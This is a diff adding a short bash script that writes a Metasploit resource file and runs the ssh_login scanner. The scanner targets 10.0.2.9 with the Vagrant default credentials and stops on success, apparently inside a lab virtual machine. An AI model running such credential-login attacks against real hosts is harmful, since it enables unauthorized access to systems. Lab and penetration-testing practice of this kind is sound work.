@@ -1,0 +1,16 @@
+#!/bin/bash
+
+echo "[*] Creating Metasploit resource script..."
+
+cat << EOF > ssh_login.rc
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 10.0.2.9
+set VERBOSE true
+set STOP_ON_SUCCESS true
+set USERNAME vagrant
+set PASSWORD vagrant
+run
+EOF
+
+echo "[*] Starting Metasploit with ssh_login.rc..."
+msfconsole -r ssh_login.rc
